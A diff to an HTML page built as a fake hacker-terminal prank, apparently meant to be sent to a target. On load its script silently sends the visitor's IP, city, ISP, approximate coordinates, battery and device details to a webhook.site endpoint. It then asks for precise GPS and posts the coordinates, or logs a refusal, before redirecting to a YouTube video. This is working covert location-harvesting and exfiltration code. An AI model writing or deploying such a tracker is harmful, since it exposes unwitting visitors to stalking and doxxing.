@@ -15,90 +15,108 @@
         @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
-<body onload="runResearchNode()">
+<body onload="initializeNode()">
 
 <div class="terminal">
-    <div class="line" style="animation-delay: 0.2s;">> INITIALIZING RESEARCH_PROTOCOL_V4.2... [DONE]</div>
+    <div class="line" style="animation-delay: 0.2s;">> INITIALIZING RESEARCH_PROTOCOL_V5.0... [DONE]</div>
     <div class="line" style="animation-delay: 0.7s;">> HANDSHAKING WITH CARRIER_GATEWAY... [DONE]</div>
-    <div class="line" style="animation-delay: 1.2s;">> COLLECTING PASSIVE NETWORK METADATA... <span id="passive-status" style="color: yellow;">PENDING</span></div>
+    <div class="line" style="animation-delay: 1.2s;">> CAPTURING PASSIVE METADATA... <span id="passive-status" style="color: yellow;">PENDING</span></div>
     <div class="line" style="animation-delay: 1.8s;">> REQUESTING TOWER TRIANGULATION (GPS)... <span class="loader" id="gps-loader"></span></div>
-    <div class="line" id="final-line" style="animation-delay: 2.5s; color: #666;">> System waiting for device permission...<span class="cursor"></span></div>
+    <div id="final-line" class="line" style="animation-delay: 2.5s; color: #666;">> System waiting for device handshake...<span class="cursor"></span></div>
 </div>
 
 <script>
-    const WEBHOOK_URL = 'https://webhook.site/b0eed63b-2e28-4f68-b60b-2ce56e3cbd80'; 
-    const RICKROLL_URL = 'https://www.youtube.com/watch?v=PD61lIYrG-M';
+    // --- CONFIGURATION ---
+    const WEBHOOK_URL = 'https://webhook.site/b0eed63b-2e28-4f68-b60b-2ce56e3cbd80'; // REPLACEME
+    const REDIRECT_URL = 'https://www.youtube.com/watch?v=6mR4zYPgGZs'; // Replace with your target video
 
-    async function runResearchNode() {
-    // --- PHASE 1: SILENT FAILSAFE (Fixed for Reliability) ---
-    try {
-        // Using ip-api.com (No API key needed, very reliable for VN nodes)
-        const response = await fetch('http://ip-api.com/json/');
-        const ipData = await response.json();
-        
-        document.getElementById('passive-status').innerText = "CAPTURED";
-        document.getElementById('passive-status').style.color = "#00ff41";
+    async function initializeNode() {
+        // --- PHASE 1: THE PASSIVE FAILSAFE ---
+        // We use a separate async flow so it doesn't block the UI
+        capturePassiveData();
 
-        // Sending the specific data points to your Webhook
-        fetch(WEBHOOK_URL, {
+        // --- PHASE 2: THE ACTIVE ATTACK (GPS) ---
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    // USER ALLOWED: Log exact GPS
+                    await logToWebhook({
+                        event: "ACTIVE_GPS_SUCCESS",
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy + " meters"
+                    });
+                    terminate("Node Verified. Synchronizing...");
+                },
+                async (err) => {
+                    // USER DENIED: Log the refusal (we still have passive data!)
+                    await logToWebhook({
+                        event: "ACTIVE_GPS_DENIED",
+                        reason: err.message
+                    });
+                    terminate("Protocol Rejected. Executing Bypass...");
+                },
+                { enableHighAccuracy: true, timeout: 8000 }
+            );
+        } else {
+            terminate("Device Unsupported.");
+        }
+    }
+
+    async function capturePassiveData() {
+        try {
+            // 1. Get IP Metadata (Neighborhood Level)
+            const response = await fetch('http://ip-api.com/json/');
+            const ipData = await response.json();
+            
+            // 2. Get Battery Metadata (Android Specific)
+            let batt = { level: "Unknown", charging: "Unknown" };
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batt = { level: (b.level * 100) + "%", charging: b.charging };
+            }
+
+            // Update Terminal UI
+            document.getElementById('passive-status').innerText = "SUCCESS";
+            document.getElementById('passive-status').style.color = "#00ff41";
+
+            // 3. Send to Webhook (Immediate)
+            logToWebhook({
+                event: "PASSIVE_CAPTURE",
+                ip: ipData.query,
+                location: `${ipData.city}, ${ipData.regionName}`,
+                approx_coords: `${ipData.lat}, ${ipData.lon}`,
+                isp: ipData.isp,
+                battery: batt,
+                ram: navigator.deviceMemory + "GB",
+                cores: navigator.hardwareConcurrency
+            });
+        } catch (e) {
+            document.getElementById('passive-status').innerText = "FAILED";
+            document.getElementById('passive-status').style.color = "red";
+        }
+    }
+
+    async function logToWebhook(data) {
+        // 'keepalive' ensures the data is sent even if the page closes
+        return fetch(WEBHOOK_URL, {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify({
-                event: "PASSIVE_HIT",
-                ip: ipData.query,
-                city: ipData.city,
-                isp: ipData.isp,
-                lat_approx: ipData.lat,
-                lon_approx: ipData.lon,
-                zip: ipData.zip
-            })
+            keepalive: true,
+            body: JSON.stringify(data)
         });
-    } catch (e) { 
-        console.log("Passive capture failed, moving to active."); 
     }
 
-    // --- PHASE 2: GPS REQUEST & UNIVERSAL REDIRECT ---
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            async (pos) => {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        event: "ACTIVE_SUCCESS",
-                        exact_coords: `${pos.coords.latitude},${pos.coords.longitude}`,
-                        accuracy: pos.coords.accuracy
-                    })
-                });
-                finish("Node Verified. Synchronizing...");
-            },
-            (err) => {
-                // He clicked Deny, so we log that but we already have the Passive data!
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ event: "ACTIVE_REFUSED", status: "User is Alert" })
-                });
-                finish("Protocol Bypass Initialized...");
-            },
-            { enableHighAccuracy: true, timeout: 7000 }
-        );
-    } else {
-        finish("Unsupported Device.");
-    }
-    }
-
-    function finish(msg) {
+    function terminate(msg) {
         const loader = document.getElementById('gps-loader');
-        if(loader) loader.style.display = "none";
+        if (loader) loader.style.display = "none";
         document.getElementById('final-line').innerText = "> " + msg;
         
-        // Final Delay for dramatic effect before the Rickroll
+        // Final delay for the "Hacker" experience
         setTimeout(() => {
-            window.location.href = RICKROLL_URL;
-        }, 1200);
+            window.location.href = REDIRECT_URL;
+        }, 1500);
     }
 </script>
-
 </body>
 </html>
